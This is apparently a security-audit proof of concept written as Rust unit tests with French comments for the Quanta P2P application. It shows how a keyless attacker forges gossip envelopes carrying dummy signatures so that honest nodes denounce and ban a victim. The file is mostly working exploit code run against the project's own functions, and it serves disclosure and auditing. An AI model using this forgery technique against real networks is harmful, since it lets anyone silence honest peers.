// PoC exécutable — Quanta v3.15.1, commit de24411.
// À coller à la fin de src-tauri/src/p2p/dispatcher.rs puis :
//   cargo test --lib audit_poc -- --nocapture
// Vérifié le 2026-08-13 : 3 passed.

// ─── PoC AUDIT (ajouté hors dépôt, worktree jetable) ────────────────────────
#[cfg(test)]
mod audit_poc {
    use super::*;
    use crate::security::CryptoEngine;

    fn poc_state() -> Arc<crate::AppState> {
        Arc::new(crate::AppState {
            crypto: tokio::sync::Mutex::new(CryptoEngine::new()),
            db: tokio::sync::Mutex::new(None),
            node: crate::p2p::willow_node::WillowNode::new(),
            unlock_guard: crate::UnlockGuard::default(),
            display_name: tokio::sync::RwLock::new(None),
            app_handle: tokio::sync::RwLock::new(None),
        })
    }

    /// PoC-1 — DIFFAMATION À DISTANCE.
    /// Un attaquant SANS AUCUNE CLÉ forge une enveloppe qui prétend venir de la
    /// victime, avec une signature bidon. Le nœud honnête, à la vérification
    /// ratée, DIFFUSE un `ReportPeer` désignant la victime. Trois nœuds
    /// honnêtes indépendants suffisent alors à bannir la victime partout.
    #[tokio::test]
    async fn poc1_invalid_signature_makes_the_node_denounce_the_claimed_sender() {
        let state = poc_state();
        // On donne au nœud honnête une identité pour qu'il puisse signer sa
        // propre diffusion (sinon `broadcast` sort silencieusement).
        state.crypto.lock().await.generate_pq_identity().expect("identite du noeud honnete");

        // La « victime » : n'importe quelle clé publique ML-DSA connue du réseau
        // (elle est publique par construction — c'est le champ `sender` de tous
        // ses messages).
        let mut victim = CryptoEngine::new();
        victim.generate_pq_identity().expect("identite victime");
        let victim_pk = victim.pq_identity_hex().expect("pk victime");

        // L'attaquant ne possède RIEN. Il choisit le sender, le nonce, l'heure,
        // le payload, calcule l'id canonique (fonction publique), et met une
        // signature arbitraire.
        let payload = GossipMessage::Ping { nonce: 1 };
        let ts = chrono::Utc::now().to_rfc3339();
        let nonce = 1u64;
        let id = GossipRouter::envelope_id(&victim_pk, nonce, &ts, &payload);
        let forged = GossipEnvelope {
            id,
            sender: victim_pk.clone(),
            payload,
            signature: hex::encode([0u8; 3309]), // signature ML-DSA-65 bidon
            timestamp: ts,
            nonce,
        };
        let raw = serde_json::to_vec(&forged).expect("json");

        let reported_before = state.node.gossip.read().await.stats.peers_reported;
        dispatch_incoming(&state, &raw).await;

        let g = state.node.gossip.read().await;
        assert_eq!(
            g.stats.dropped_signature, 1,
            "la signature bidon doit être détectée"
        );
        assert!(
            g.stats.peers_reported > reported_before,
            "le nœud a-t-il dénoncé quelqu'un ? peers_reported doit avoir augmenté"
        );
        // Le point de l'attaque : la dénonciation nomme la VICTIME, dont
        // l'implication n'a jamais été prouvée — la signature était fausse.
        println!(
            "PoC-1 : 1 enveloppe non authentifiée -> dropped_signature={} peers_reported={} \
             (le nœud a signé et diffusé un ReportPeer nommant {})",
            g.stats.dropped_signature,
            g.stats.peers_reported,
            &victim_pk[..24]
        );
    }

    /// PoC-2 — trois signalements INDÉPENDANTS suffisent, et le banni est
    /// ensuite jeté à l'entrée du pipeline.
    #[tokio::test]
    async fn poc2_three_independent_reports_ban_the_victim() {
        let mut tracker = NonceTracker::new();
        let victim = "VICTIME_PK";
        for i in 0..REPORT_BAN_THRESHOLD {
            let reporter = format!("NOEUD_HONNETE_{}", i);
            let n = tracker.record_report(victim, &reporter);
            println!("PoC-2 : signalement {} par {} -> {} rapporteur(s)", i + 1, reporter, n);
        }
        assert!(
            tracker.is_banned(victim),
            "{} rapporteurs indépendants doivent suffire à bannir",
            REPORT_BAN_THRESHOLD
        );
        println!("PoC-2 : victime BANNIE pour {} s", REPORT_BAN_TTL_SECS);
    }

    /// PoC-3 — CHAÎNE COMPLÈTE, de bout en bout.
    /// L'attaquant n'a aucune clé. Il envoie 3 enveloppes forgées au nom de la
    /// victime à 3 nœuds honnêtes. Chacun émet un ReportPeer SIGNÉ nommant la
    /// victime. Un 4e nœud reçoit ces 3 signalements authentiques : il bannit la
    /// victime. Ensuite, un message PARFAITEMENT VALIDE de la victime est jeté.
    #[tokio::test]
    async fn poc3_end_to_end_an_attacker_without_keys_silences_an_honest_node() {
        // La victime, un nœud honnête ordinaire.
        let mut victim = CryptoEngine::new();
        victim.generate_pq_identity().expect("victime");
        let victim_pk = victim.pq_identity_hex().expect("pk victime");

        // Trois nœuds honnêtes qui vont recevoir la forgerie.
        let mut honest = Vec::new();
        for _ in 0..3 {
            let st = poc_state();
            st.crypto.lock().await.generate_pq_identity().expect("noeud honnete");
            honest.push(st);
        }

        // ── Étape 1 : l'attaquant forge, sans posséder la moindre clé.
        for (i, st) in honest.iter().enumerate() {
            let payload = GossipMessage::Ping { nonce: (i as u64) + 1 };
            let ts = chrono::Utc::now().to_rfc3339();
            let nonce = (i as u64) + 1;
            let id = GossipRouter::envelope_id(&victim_pk, nonce, &ts, &payload);
            let forged = GossipEnvelope {
                id,
                sender: victim_pk.clone(),
                payload,
                signature: hex::encode([0u8; 3309]),
                timestamp: ts,
                nonce,
            };
            dispatch_incoming(st, &serde_json::to_vec(&forged).unwrap()).await;
            assert_eq!(
                st.node.gossip.read().await.stats.peers_reported, 1,
                "le noeud honnete {} doit avoir denonce la victime", i
            );
        }

        // ── Étape 2 : chaque nœud honnête a signé un ReportPeer. On les rejoue
        // vers une quatrième victime collatérale : le nœud « observateur ».
        let observer = poc_state();
        observer.crypto.lock().await.generate_pq_identity().expect("observateur");

        for (i, st) in honest.iter().enumerate() {
            let reporter_pk = st.crypto.lock().await.pq_identity_hex().unwrap();
            let msg = GossipMessage::ReportPeer {
                peer_id: victim_pk.clone(),
                reason: ReportReason::InvalidSignature,
            };
            let ts = chrono::Utc::now().to_rfc3339();
            let nonce = (i as u64) + 1;
            let signable = GossipRouter::signable_envelope_bytes(&reporter_pk, nonce, &ts, &msg);
            let sig = st.crypto.lock().await.sign_pq(&signable).expect("signature honnete");
            let env = GossipEnvelope {
                id: GossipRouter::envelope_id(&reporter_pk, nonce, &ts, &msg),
                sender: reporter_pk,
                payload: msg,
                signature: hex::encode(&sig),
                timestamp: ts,
                nonce,
            };
            dispatch_incoming(&observer, &serde_json::to_vec(&env).unwrap()).await;
        }

        // ── Étape 3 : la victime est bannie chez l'observateur.
        assert!(
            observer.node.nonce_tracker.write().await.is_banned(&victim_pk),
            "3 signalements honnetes et independants doivent bannir la victime"
        );

        // ── Étape 4 : un message PARFAITEMENT VALIDE de la victime est jeté.
        let msg = GossipMessage::Ping { nonce: 42 };
        let ts = chrono::Utc::now().to_rfc3339();
        let signable = GossipRouter::signable_envelope_bytes(&victim_pk, 7, &ts, &msg);
        let sig = victim.sign_pq(&signable).expect("la victime signe correctement");
        let good = GossipEnvelope {
            id: GossipRouter::envelope_id(&victim_pk, 7, &ts, &msg),
            sender: victim_pk.clone(),
            payload: msg,
            signature: hex::encode(&sig),
            timestamp: ts,
            nonce: 7,
        };
        let before = observer.node.gossip.read().await.stats.messages_received;
        dispatch_incoming(&observer, &serde_json::to_vec(&good).unwrap()).await;
        let after = observer.node.gossip.read().await.stats.messages_received;
        assert_eq!(
            before, after,
            "le message VALIDE de la victime doit avoir ete jete avant tout traitement"
        );
        println!(
            "PoC-3 : 3 enveloppes forgees (0 cle) -> victime {} BANNIE {} s, \
             son trafic valide n'est meme plus compte",
            &victim_pk[..16], REPORT_BAN_TTL_SECS
        );
    }

}
